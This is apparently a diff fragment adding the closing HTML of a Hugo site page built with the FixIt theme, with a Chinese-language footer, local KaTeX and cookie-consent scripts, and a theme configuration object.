+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
